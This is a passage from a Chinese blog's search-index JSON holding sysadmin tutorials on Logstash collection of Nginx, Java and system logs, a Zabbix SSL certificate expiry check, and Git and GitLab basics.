接下来就配置输出到kafka或elasticsearch吧。若中间出了错误，就检查之前的步骤即可","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"kibana","slug":"kibana","permalink":"https://garywu520.github.io/tags/kibana/"},{"name":"logstash","slug":"logstash","permalink":"https://garywu520.github.io/tags/logstash/"},{"name":"elk","slug":"elk","permalink":"https://garywu520.github.io/tags/elk/"},{"name":"output","slug":"output","permalink":"https://garywu520.github.io/tags/output/"},{"name":"codec","slug":"codec","permalink":"https://garywu520.github.io/tags/codec/"},{"name":"rubydebug","slug":"rubydebug","permalink":"https://garywu520.github.io/tags/rubydebug/"}]},{"title":"Logstash收集Nginx日志","slug":"Logstash收集Nginx日志","date":"2017-12-19T09:45:49.000Z","updated":"2017-12-19T13:34:33.265Z","comments":true,"path":"2017/12/19/Logstash收集Nginx日志/","link":"","permalink":"https://garywu520.github.io/2017/12/19/Logstash%E6%94%B6%E9%9B%86Nginx%E6%97%A5%E5%BF%97/","excerpt":"基础环境配置 123456789101112131415161718#安装rpm -ivh logstash-5.6.5.rpm #配置软链ln -s &#x2F;etc&#x2F;logstash &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config#配置vim &#x2F;etc&#x2F;logstash&#x2F;logstash.yml path.config: &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d #修改path.config到这个目录#启动systemctl start logstashsystemctl status logstashsystemctl enable logstash#软链启动命令ln -s &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash &#x2F;sbin","text":"基础环境配置 123456789101112131415161718#安装rpm -ivh logstash-5.6.5.rpm #配置软链ln -s &#x2F;etc&#x2F;logstash &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config#配置vim &#x2F;etc&#x2F;logstash&#x2F;logstash.yml path.config: &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d #修改path.config到这个目录#启动systemctl start logstashsystemctl status logstashsystemctl enable logstash#软链启动命令ln -s &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash &#x2F;sbin 部署Nginx服务 123456789yum install -y gcc gcc-c++ gcc-g77 flex bison autoconf automake bzip2-devel zlib-devel ncurses-devel libjpeg-devel libpng-devel libtiff-devel freetype-devel pam-devel openssl-devel libxml2-devel gettext-devel pcre-devel#下载nginxcd &#x2F;usr&#x2F;local&#x2F;src&#x2F; &amp;&amp; wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.10.3.tar.gztar xvf nginx-1.10.3.tar.gzcd nginx-1.10.3 &amp;&amp; .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx-1.10.3make &amp;&amp; make installln -sv &#x2F;usr&#x2F;local&#x2F;nginx-1.10.3 &#x2F;usr&#x2F;local&#x2F;nginx 编辑配置文件并准备web界面 12345678910111213141516cd &#x2F;usr&#x2F;local&#x2F;nginx &amp;&amp; vim conf&#x2F;nginx.conf #配置改为如下location &#x2F;web &#123; root html; index index.html index.htm; &#125; mkdir &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;webecho &quot; Nginx WebPage! &quot; &gt;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;web&#x2F;index.html&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -t #测试配置文件语法&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx #启动服务&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload #重读配置文件#检查端口[root@localhost nginx]# ss -lntup|grep 80tcp LISTEN 0 128 *:80 *:* users:((&quot;nginx&quot;,pid&#x3D;27111,fd&#x3D;6),(&quot;nginx&quot;,pid&#x3D;27108,fd&#x3D;6)) 访问nginx测试界面 12[root@localhost nginx]# curl http:&#x2F;&#x2F;127.0.0.1&#x2F;web&#x2F;Nginx WebPage! 将nginx日志转换为json格式 1vim conf&#x2F;nginx.conf #修改为如下json日志格式 1234567891011121314log_format access_json &#39;&#123;&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&#39;&#39;&quot;host&quot;:&quot;$server_addr&quot;,&#39;&#39;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#39;&#39;&quot;size&quot;:$body_bytes_sent,&#39;&#39;&quot;responsetime&quot;:$request_time,&#39;&#39;&quot;upstreamtime&quot;:&quot;$upstream_response_time&quot;,&#39;&#39;&quot;upstreamhost&quot;:&quot;$upstream_addr&quot;,&#39;&#39;&quot;http_host&quot;:&quot;$host&quot;,&#39;&#39;&quot;url&quot;:&quot;$uri&quot;,&#39;&#39;&quot;domain&quot;:&quot;$host&quot;,&#39;&#39;&quot;xff&quot;:&quot;$http_x_forwarded_for&quot;,&#39;&#39;&quot;referer&quot;:&quot;$http_referer&quot;,&#39;&#39;&quot;status&quot;:&quot;$status&quot;&#125;&#39;;access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log access_json; 123456789101112#创建nginx日志目录mkdir &#x2F;var&#x2F;log&#x2F;nginx#测试nginx配置文件&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -t#重启nginx服务&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload #测试访问:目的生成访问日志[root@localhost nginx]# curl http:&#x2F;&#x2F;127.0.0.1&#x2F;web&#x2F;Nginx WebPage! 确认日志格式为json 1234访问https:&#x2F;&#x2F;www.bejson.com&#x2F;验证日志是否为标准json[root@localhost nginx]# tail &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#123;&quot;@timestamp&quot;:&quot;2017-12-19T18:32:46+08:00&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;clientip&quot;:&quot;127.0.0.1&quot;,&quot;size&quot;:16,&quot;responsetime&quot;:0.000,&quot;upstreamtime&quot;:&quot;-&quot;,&quot;upstreamhost&quot;:&quot;-&quot;,&quot;http_host&quot;:&quot;127.0.0.1&quot;,&quot;url&quot;:&quot;&#x2F;web&#x2F;index.html&quot;,&quot;domain&quot;:&quot;127.0.0.1&quot;,&quot;xff&quot;:&quot;-&quot;,&quot;referer&quot;:&quot;-&quot;,&quot;status&quot;:&quot;200&quot;&#125; 配置logstash收集nginx访问日志到前台页面(测试输出) 1vim &#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;nginx.conf 1234567891011121314input &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&quot; start_position &#x3D;&gt; &quot;end&quot; type &#x3D;&gt; &quot;nginx-accesslog&quot; codec &#x3D;&gt; json &#125;&#125;output &#123; stdout &#123; codec &#x3D;&gt; rubydebug &#125;&#125; 检测logstash配置文件语法并重启服务 1logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;nginx.conf -t 前台启动logstash 12345systemctl stop logstashlogstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;nginx.conf刷新nginx测试页面,等待屏幕输出如果输出的是json格式说明OK nginx日志配置输出到elasticsearch 1234567891011121314151617input &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&quot; start_position &#x3D;&gt; &quot;end&quot; type &#x3D;&gt; &quot;nginx-accesslog&quot; codec &#x3D;&gt; json &#125;&#125;output &#123; if [type] &#x3D;&#x3D; &quot;nginx-accesslog&quot; &#123; elasticsearch &#123; hosts &#x3D;&gt; [&quot;10.0.10.21:9200&quot;] index &#x3D;&gt; &quot;logstash-nginx-accesslog-1024-%&#123;+YYYY.MM.dd&#125;&quot; &#125;&#125;&#125; 访问elasticsearch-head插件 12访问nginx页面:http:&#x2F;&#x2F;10.0.10.24&#x2F;web&#x2F; ，多刷新几次，目的：再次生成访问日志。访问head插件页面：http:&#x2F;&#x2F;10.0.10.21:9100 查看刚才的nginx索引 添加到kibana 1把索引配置到kibana","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"kibana","slug":"kibana","permalink":"https://garywu520.github.io/tags/kibana/"},{"name":"logstash","slug":"logstash","permalink":"https://garywu520.github.io/tags/logstash/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"}]},{"title":"zabbix监控https_ssl证书是否过期","slug":"zabbix监控https-ssl证书是否过期","date":"2017-12-18T09:52:09.000Z","updated":"2020-08-12T09:48:01.932Z","comments":true,"path":"2017/12/18/zabbix监控https-ssl证书是否过期/","link":"","permalink":"https://garywu520.github.io/2017/12/18/zabbix%E7%9B%91%E6%8E%A7https-ssl%E8%AF%81%E4%B9%A6%E6%98%AF%E5%90%A6%E8%BF%87%E6%9C%9F/","excerpt":"业务需求 1https证书在到期前半个月进行高级提示，便于续费。","text":"业务需求 1https证书在到期前半个月进行高级提示，便于续费。 1. 编写脚本cat /var/qstscripts/ssl_check.sh 12345678910111213141516#利用SNI特性检查证书有效期#!/bin/bashhost=$1port=$2end_date=`/usr/bin/openssl s_client -servername $host -host $host -port $port -showcerts &lt;/dev/null 2&gt;/dev/null | sed -n &#x27;/BEGIN CERTIFICATE/,/END CERT/p&#x27; | /usr/bin/openssl x509 -text 2&gt;/dev/null | sed -n &#x27;s/ *Not After : *//p&#x27;`if [ -n &quot;$end_date&quot; ]then end_date_seconds=`date &#x27;+%s&#x27; --date &quot;$end_date&quot;` now_seconds=`date &#x27;+%s&#x27;` echo &quot;($end_date_seconds-$now_seconds)/24/3600&quot; | bcfi 测试脚本 12chmod +x ssl_check.shsh ssl_check.sh www.baidu.com 443 注：SSL证书监控脚本仅部署在了zabbix server服务器 2. 配置自定义key1cd /etc/zabbix/zabbix_agentd.d cat userparameter_ssl.conf 12#ssl_time_statusUserParameter=ssl.status[*],/var/umscripts/ssl_check.sh $1 $2 1systemctl restart zabbix-agent 4. 配置ssl check监控模板及应用模板 SSL模板监控项： 键值：ssl.status[xxx.xxx.com,443]","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"https","slug":"https","permalink":"https://garywu520.github.io/tags/https/"},{"name":"ssl","slug":"ssl","permalink":"https://garywu520.github.io/tags/ssl/"}]},{"title":"Git分布式版本控制","slug":"Git版本控制","date":"2017-12-16T01:45:10.000Z","updated":"2017-12-22T09:58:27.929Z","comments":true,"path":"2017/12/16/Git版本控制/","link":"","permalink":"https://garywu520.github.io/2017/12/16/Git%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/","excerpt":"Git 1Git是一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。","text":"Git 1Git是一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 安装git 1234yum install -y git[root@gitlab ~]# git versiongit version 1.8.3.1 Git全局配置 1234567git config --global user.name &quot;garywu&quot; #配置git使用用户git config --global user.email &quot;617597237@qq.com&quot; #配置git使用邮箱git config --global color.ui true #语法高亮git config --list # 查看全局配置以上配置实际上修改的是当前用户家目录的gitconfig文件cat ~&#x2F;.gitconfig 初始化git目录 12345678#创建git工作目录mkdir git_data &amp;&amp; cd git_data#初始化git init#查看工作去状态git status 常规使用 创建数据 –&gt; 提交数据 12345cd git_data &amp;&amp; touch README #在工作目录创建测试文件git statusgit add filename #把数据放到暂存区域或 git add *git statusgit commit -m &#39;first commit&#39; #提交暂存区域数据到本地仓库, -m为提交添加注释 直接提交(针对已存在的文件) 123456README文件上一步已经存在echo &quot;hello&quot; &gt;&gt; README #向README文件追加新内容git commit -a -m &#39;内容新增了hello字符串&#39; 注: -a, --all参数表示直接提交 删除暂存区数据 方式一: 12345touch test.txtgit add test.txt #添加test.txt到暂存区git statusgit reset HEAD test.txt #将文件从暂存区撤回git status 方式二： 1234git add test.txt #将文件添加到暂存区git statusgit rm --cached test.txt #将文件从暂存区撤回git status 重命名 1git mv kkk.txt test.txt 查看提交历史记录1234567891011121314151617181920#查看提交历史记录git log #查看最近几条记录git log -2 #-p显示每次提交的内容差异,例如仅查看最近一次差异git log -p -1 #--stat简要显示数据增改行数，这样能够看到提交中修改过的内容，对文件添加或移动的行数，并在最后列出所有增减行的概要信息git log --stat -2#--pretty根据不同的格式展示提交的历史信息git log --pretty&#x3D;oneline#以更详细的模式输出提交的历史记录git log --pretty&#x3D;fuller -2#查看当前所有提交记录的简短SHA-1哈希字串与提交者的姓名，其他格式见备注。git log --pretty&#x3D;fomat:&quot;%h %cn&quot; 还原历史数据1Git服务程序中有一个叫做HEAD的版本指针，每次进行数据还原可以理解为断开当前版本的软链并与指定版本进行软链 从本地仓库回滚到指定版本号 1234567891011[root@gitlab git_data]# git reset --hard 2c1897HEAD is now at 2c1897c touch创建README#注2c1897是要还原到目标版本的版本号，为了简写可以保留前几位，只要与其他不重复即可。[root@gitlab git_data]# [root@gitlab git_data]# git logcommit 2c1897c75502d0fa637f938c20d35db92d6587f1Author: garywu &lt;617597237@qq.com&gt;Date: Fri Dec 15 21:23:26 2017 -0500 touch创建README 还原未来数据 12345678910回滚后，之前的数据相当于是未来数据，那么假如说回滚错误，如何重新回滚？[root@gitlab git_data]# git reflog #查看所有的本地仓库版本信息2c1897c HEAD@&#123;0&#125;: reset: moving to 2c1897242bac0 HEAD@&#123;1&#125;: commit: 内容新增了hello字符串d1c2c7b HEAD@&#123;2&#125;: commit: 第2次commit2c1897c HEAD@&#123;3&#125;: commit (initial): touch创建README[root@gitlab git_data]# git reset --hard 242bac0 #回滚到指定版本HEAD is now at 242bac0 内容新增了hello字符串 给当前版本打标签Tag 12345678910111213前面回滚使用的是一串字符串，又长又难记。git tag v1.0 #当前提交内容打一个标签(方便快速回滚)，每次提交都可以打个tag。git tag #查看当前所有的标签git show v1.0 #查看当前1.0版本的详细信息git tag v1.2 -m &quot;version 1.2 release is test&quot; #创建带有说明的标签,-a指定标签名字，-m指定说明文字git tag -d v1.0 #我们为同一个提交版本设置了两次标签,删除之前的v1.0 123git tag v20171111 #给当前版本打标签git tag #查看所有标签git show v20171111 #查看当前tag对应的版本详情 利用tag标签回滚 123给当前版本打上标签后，切换到其他版本模拟tag回滚git reset --hard v20171111git log 对比数据1git diff &lt;filename&gt; 123456789[root@gitlab git_data]# echo &quot;test&quot; &gt;&gt; kkk.txt [root@gitlab git_data]# git diff kkk.txt diff --git a&#x2F;kkk.txt b&#x2F;kkk.txtindex e69de29..9daeafb 100644--- a&#x2F;kkk.txt+++ b&#x2F;kkk.txt@@ -0,0 +1 @@+test Git分支结构12在实际的项目开发中，尽量保证master分支稳定，仅用于发布新版本，一般禁止直接修改里面的数据文件。开发可以在dev分支上。dev再创建多个自分支，让开发在各自分支进行开发，开发完成后合并分支到dev 12[root@gitlab git_data]# git status# On branch master #默认就在master分支 创建分支 123456789[root@gitlab git_data]# git branch dev #创建dev分支[root@gitlab git_data]# git branch #查看当前所在分支&#x2F;查看所有分支 dev* master[root@gitlab git_data]# git checkout dev #切换分支到dev[root@gitlab git_data]# git branch #查看当前所在分支&#x2F;查看所有分支* dev master 123456789101112注：切换分支之前请务必commit，否则修改会丢失。[root@gitlab git_data]# git checkout dev #切换分支到dev[root@gitlab git_data]# echo &quot;dev branch&quot; &gt;&gt; kkk.txt [root@gitlab git_data]# git status[root@gitlab git_data]# git commit -a -m &quot;dev-commit&quot; #提交[root@gitlab git_data]# git logcommit 995e05e17422e736eceb2d4230c93b78fcd0c9b2Author: garywu &lt;617597237@qq.com&gt;Date: Sat Dec 16 01:14:37 2017 -0500 dev-commit 分支自动合并 自动合并：只有文件同一行内容没有冲突，就可以自动合并 12345678[root@gitlab git_data]# git checkout master #切换到master分支Switched to branch &#39;master&#39;[root@gitlab git_data]# git merge dev #把dev分支自动合并到当前分支Updating 242bac0..995e05eFast-forward kkk.txt | 2 ++ 1 file changed, 2 insertions(+) 合并冲突： 文件冲突 – 文件的同一行有不同的内容 12345678910模拟冲突(分别修改不同分支文件中的同一行的内容并提交)：echo &quot;master-test&quot; &gt;&gt;kkk.txt #在master分支向文件输出测试内容git commit -a -m &quot;this is master-test&quot; #提交git checkout dev #切换分支到devecho &quot;dev-test&quot; &gt;&gt; kkk.txt #在dev分支向文件输出测试内容git commit -a -m &quot;this is dev-test&quot; #提交git branch master #再次切换到master分支git merge dev #进行合并 12345合并冲突：[root@gitlab git_data]# git merge devAuto-merging kkk.txtCONFLICT (content): Merge conflict in kkk.txtAutomatic merge failed; fix conflicts and then commit the result. 手动解决合并冲突 123456789101112131415161718192021222324修改提交的文件，保留要留下的内容，其他冲突内容删除[root@gitlab git_data]# cat kkk.txt testdev branch&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADmaster-test&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;dev-test&gt;&gt;&gt;&gt;&gt;&gt;&gt; dev#比如要保留master-test，其他提示内容都删除，删除后文件内容如下：[root@gitlab git_data]# cat kkk.txt testdev branchmaster-test#再次提交[root@gitlab git_data]# git commit -a -m &quot;解决合并冲突&quot; [master 071f8cd] 解决合并冲突#重新进行合并[root@gitlab git_data]# git merge devAlready up-to-date.可以看到，冲突已经解决。 删除dev分支 1git branch -d dev Git 服务器仓库上传下载代码 安装gitlab 1https:&#x2F;&#x2F;wuyanteng.github.io&#x2F;2017&#x2F;12&#x2F;05&#x2F;Gitlab%E9%83%A8%E7%BD%B2CentOS7&#x2F; 创建仓库 12345678910111213#全局配置git config --global user.name &quot;GaryWu&quot;git config --global user.email &quot;617597237@qq.com&quot;#首次下载仓库使用git clone命令git clone git@linux16:root&#x2F;37team.git #切换到project目录cd 37teamtouch README.md #创建文件git add README.md #添加到缓存区git commit -m &quot;add README&quot; #提交git push -u origin master #传输到远端Git Server 测试 1在Gitlab中的README.md中编辑添加一些内容,然后点击下面的提交Commit changes git客户端pull下载代码库 123456789101112git pull #非首次下载仓库直接git pull即可[root@linux16 37team]# git pullremote: Counting objects: 3, done.remote: Total 3 (delta 0), reused 0 (delta 0)Unpacking objects: 100% (3&#x2F;3), done.From 192.168.56.16:root&#x2F;37team eea16b7..5d40d9c master -&gt; origin&#x2F;masterUpdating eea16b7..5d40d9cFast-forward README.md | 5 +++++ 1 file changed, 5 insertions(+)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://garywu520.github.io/tags/Gitlab/"},{"name":"Git","slug":"Git","permalink":"https://garywu520.github.io/tags/Git/"},{"name":"svn","slug":"svn","permalink":"https://garywu520.github.io/tags/svn/"},{"name":"版本控制","slug":"版本控制","permalink":"https://garywu520.github.io/tags/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"}]},{"title":"logstash收集java日志","slug":"logstash收集java日志","date":"2017-12-14T07:21:57.000Z","updated":"2017-12-14T08:13:33.852Z","comments":true,"path":"2017/12/14/logstash收集java日志/","link":"","permalink":"https://garywu520.github.io/2017/12/14/logstash%E6%94%B6%E9%9B%86java%E6%97%A5%E5%BF%97/","excerpt":"1使用codec 的multiline 插件实现多行匹配，这是一个可以将多行进行合并的插件，而且可以使用what指定将匹配到的行与前面的行合并还是和后面的行合并。具体参考：https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;logstash&#x2F;current&#x2F;plugins-codecs-multiline.html","text":"1使用codec 的multiline 插件实现多行匹配，这是一个可以将多行进行合并的插件，而且可以使用what指定将匹配到的行与前面的行合并还是和后面的行合并。具体参考：https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;logstash&#x2F;current&#x2F;plugins-codecs-multiline.html 在elasticsearch服务器部署logstash 123456789101112131415161718#安装rpm -ivh logstash-5.6.5.rpm #配置软链ln -s &#x2F;etc&#x2F;logstash &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config#配置vim &#x2F;etc&#x2F;logstash&#x2F;logstash.yml path.config: &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d #修改path.config到这个目录#启动systemctl start logstashsystemctl status logstashsystemctl enable logstash#软链启动命令ln -s &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash &#x2F;sbin 配置logstash读取日志文件规则并写入到elasticsearch 123456789101112131415161718input &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;elk&#x2F;logs&#x2F;ELK-Cluster.log&quot; type &#x3D;&gt; &quot;javalog&quot; start_position &#x3D;&gt; &quot;beginning&quot; codec &#x3D;&gt; multiline &#123; pattern &#x3D;&gt; &quot;^\\[&quot; #当遇到[为开头行的时候将进行合并 negate &#x3D;&gt; true #为匹配成功进行操作，false为不成功进行操作 what &#x3D;&gt; &quot;previous&quot; #与上面的行合并，如果是下面的行合并就是&quot;next&quot; &#125;&#125;&#125;output &#123; if [type] &#x3D;&#x3D; &quot;javalog&quot; &#123; elasticsearch &#123; hosts &#x3D;&gt; [&quot;10.0.10.21:9200&quot;] index &#x3D;&gt; &quot;javalog-1021-%&#123;+YYYY.MM.dd&#125;&quot; &#125;&#125;&#125; 语法验证 1&#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash -f &#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;java.conf -t 重启服务 12root@linux-host1 ~]# systemctl restart logstash #重启logstash[root@linux-host1 ~]# systemctl restart elasticsearch #目的是为了生成新的日志 kibana 界面添加javalog-1021 索引 测试生成数据 12cat &#x2F;elk&#x2F;logs&#x2F;ELK-Cluster.log &gt;&gt; &#x2F;tmp&#x2F;1cat &#x2F;tmp&#x2F;1 &gt;&gt; &#x2F;elk&#x2F;logs&#x2F;ELK-Cluster.log kibana查看最新数据 关于Sincedb 1234cat &#x2F;var&#x2F;lib&#x2F;logstash&#x2F;plugins&#x2F;inputs&#x2F;file&#x2F;.sincedb_1ced15cfacdbb0380466be84d620085all -li &#x2F;elk&#x2F;logs&#x2F;ELK-Cluster.log134219868 -rw-r--r-- 1 elasticsearch elasticsearch 29465 Apr 21 14:33 &#x2F;elk&#x2F;logs&#x2F;ELK-Cluster.log","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"kibana","slug":"kibana","permalink":"https://garywu520.github.io/tags/kibana/"},{"name":"Logstash","slug":"Logstash","permalink":"https://garywu520.github.io/tags/Logstash/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://garywu520.github.io/tags/Tomcat/"},{"name":"Java","slug":"Java","permalink":"https://garywu520.github.io/tags/Java/"}]},{"title":"通过Logstash收集日志","slug":"通过Logstash收集日志","date":"2017-12-12T13:04:43.000Z","updated":"2017-12-13T13:08:12.374Z","comments":true,"path":"2017/12/12/通过Logstash收集日志/","link":"","permalink":"https://garywu520.github.io/2017/12/12/%E9%80%9A%E8%BF%87Logstash%E6%94%B6%E9%9B%86%E6%97%A5%E5%BF%97/","excerpt":"配置logstash 123456789101112131415161718#安装rpm -ivh logstash-5.6.5.rpm #配置软链ln -s &#x2F;etc&#x2F;logstash &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config#配置vim &#x2F;etc&#x2F;logstash&#x2F;logstash.yml path.config: &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d #修改path.config到这个目录#启动systemctl start logstashsystemctl status logstashsystemctl enable logstash#软链启动命令ln -s &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash &#x2F;sbin","text":"配置logstash 123456789101112131415161718#安装rpm -ivh logstash-5.6.5.rpm #配置软链ln -s &#x2F;etc&#x2F;logstash &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config#配置vim &#x2F;etc&#x2F;logstash&#x2F;logstash.yml path.config: &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d #修改path.config到这个目录#启动systemctl start logstashsystemctl status logstashsystemctl enable logstash#软链启动命令ln -s &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;bin&#x2F;logstash &#x2F;sbin 收集单个系统日志并输出至文件1234567891011121314[root@localhost ~]# cat &#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;system-log.conf input &#123; file &#123; type &#x3D;&gt; &quot;messagelog&quot; # path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;messages&quot; start_position &#x3D;&gt; &quot;beginning&quot; #第一次从头收集,之后从新添加的日志收集 &#125;&#125;output &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;tmp&#x2F;%&#123;type&#125;.%&#123;+YYYY.MM.dd&#125;&quot; #注：此处dd必须为小写 &#125;&#125; 检测配置文件语法 1logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;system-log.conf -t 生成数据并验证 1234567echo &quot;test&quot; &gt;&gt; &#x2F;var&#x2F;log&#x2F;messagesecho &quot;测试&quot; &gt;&gt; &#x2F;var&#x2F;log&#x2F;messages[root@localhost ~]# cat &#x2F;tmp&#x2F;messagelog.2017.12.12&#123;&quot;@version&quot;:&quot;1&quot;,&quot;host&quot;:&quot;localhost.localdomain&quot;,&quot;path&quot;:&quot;&#x2F;var&#x2F;log&#x2F;messages&quot;,&quot;@timestamp&quot;:&quot;2017-12-12T14:02:22.374Z&quot;,&quot;message&quot;:&quot;Hello Logstash&quot;,&quot;type&quot;:&quot;messagelog&quot;&#125;&#123;&quot;@version&quot;:&quot;1&quot;,&quot;host&quot;:&quot;localhost.localdomain&quot;,&quot;path&quot;:&quot;&#x2F;var&#x2F;log&#x2F;messages&quot;,&quot;@timestamp&quot;:&quot;2017-12-12T14:04:15.441Z&quot;,&quot;message&quot;:&quot;测试&quot;,&quot;type&quot;:&quot;messagelog&quot;&#125;&#123;&quot;@version&quot;:&quot;1&quot;,&quot;host&quot;:&quot;localhost.localdomain&quot;,&quot;path&quot;:&quot;&#x2F;var&#x2F;log&#x2F;messages&quot;,&quot;@timestamp&quot;:&quot;2017-12-12T14:04:37.454Z&quot;,&quot;message&quot;:&quot;测试&quot;,&quot;type&quot;:&quot;messagelog&quot;&#125; 排错 12345如果没有出现上面的测试结果，则需要查看logstash日志tailf &#x2F;var&#x2F;log&#x2F;logstash&#x2F;logstash-plain.log如果提示&#x2F;var&#x2F;log&#x2F;messages Permission denied无权限，则需要给messages文件授权chmod 644 &#x2F;var&#x2F;log&#x2F;messages 通过logstash 收集多个日志文件 编辑logstash日志收集规则配置文件 1&#x2F;etc&#x2F;logstash&#x2F;conf.d&#x2F;system-log.conf 123456789101112131415161718192021222324252627282930[root@localhost conf.d]# cat system-log.conf input &#123; file &#123; path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;messages&quot; #日志&quot;收集源&quot;的文件路径 type &#x3D;&gt; &quot;systemlog&quot; #定义事件的唯一类型 start_position &#x3D;&gt; &quot;beginning&quot; #定义第一次收集日志从头开始 stat_interval &#x3D;&gt; &quot;3&quot; #定义日志收集时间间隔 &#125; file &#123; path &#x3D;&gt; &quot;&#x2F;var&#x2F;log&#x2F;secure&quot; type &#x3D;&gt; &quot;securelog&quot; start_position &#x3D;&gt; &quot;beginning&quot; stat_interval &#x3D;&gt; &quot;3&quot; &#125;&#125;output &#123; if [type] &#x3D;&#x3D; &quot;systemlog&quot; &#123; #判断type类型的value，并写入相同(或不同)的Elasticsearch集群 elasticsearch &#123; hosts &#x3D;&gt; [&quot;10.0.10.21:9200&quot;] #指定elasticsearch集群节点地址 index &#x3D;&gt; &quot;system-log-%&#123;+YYYY.MM.dd&#125;&quot; #指定收集日志到elasticsearch后的格式(注：dd必须小写) &#125;&#125; if [type] &#x3D;&#x3D; &quot;securelog&quot; &#123; elasticsearch &#123; hosts &#x3D;&gt; [&quot;10.0.10.21:9200&quot;] index &#x3D;&gt; &quot;secure-log-%&#123;+YYYY.MM.dd&#125;&quot; &#125;&#125; &#125; 检验配置文件语法是否有误 123[root@localhost conf.d]# logstash -f &#x2F;usr&#x2F;share&#x2F;logstash&#x2F;config&#x2F;conf.d&#x2F;system-log.conf -tSending Logstash&#39;s logs to &#x2F;var&#x2F;log&#x2F;logstash which is now configured via log4j2.propertiesConfiguration OK 重启logstash并查看日志是否有报错 12345systemctl restart logstashsystemctl status logstash注：如果验证后没有“Configuration OK”说明配置一定有问题。可以查看日志来确定并修改具体的错误字段tailf &#x2F;var&#x2F;log&#x2F;logstash&#x2F;logstash-plain.log 向被收集的日志中写入测试数据 12echo &quot;logstash收集多个日志文件-测试&quot; &gt;&gt; &#x2F;var&#x2F;log&#x2F;secureecho &quot;logstash收集多个日志文件-测试&quot; &gt;&gt; &#x2F;var&#x2F;log&#x2F;messages kibana界面添加system-messagess 